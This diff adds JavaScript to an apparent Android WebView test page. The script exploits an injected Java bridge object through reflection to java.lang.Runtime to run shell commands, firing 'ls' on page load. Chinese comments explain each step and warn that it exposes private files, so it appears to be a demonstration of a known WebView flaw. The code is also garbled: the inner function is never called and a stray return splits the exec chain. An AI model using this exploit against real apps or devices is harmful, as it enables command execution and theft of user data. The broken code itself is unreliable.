@@ -3,14 +3,40 @@
 
 <body>
 
-<p>����</p>
+<p>测试</p>
 </body>
 
 <script>
 
+function excute(args){
+
+ function execute(cmdArgs)  
+{  
+    // 步骤1：遍历 window 对象
+    // 目的是为了找到包含 getClass （）的对象
+    // 因为Android映射的JS对象也在window中，所以肯定会遍历到
+    for (var obj in window) {  
+        if ("getClass" in window[obj]) {  
+
+      // 步骤2：利用反射调用forName（）得到Runtime类对象
+            alert(obj);          
+            return  window[obj].getClass().forName("java.lang.Runtime")  
+
+      // 步骤3：以后，就可以调用静态方法来执行一些命令，比如访问文件的命令
+    getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);  
+
+// 从执行命令后返回的输入流中得到字符串，有很严重暴露隐私的危险。
+// 如执行完访问文件的命令之后，就可以得到文件名的信息了。
+        }  
+    }  
+}
+
 window.onload=function(){
 
         alert(JavaScriptWay.print());
+		
+		excute("ls");
+		
 
 
 }
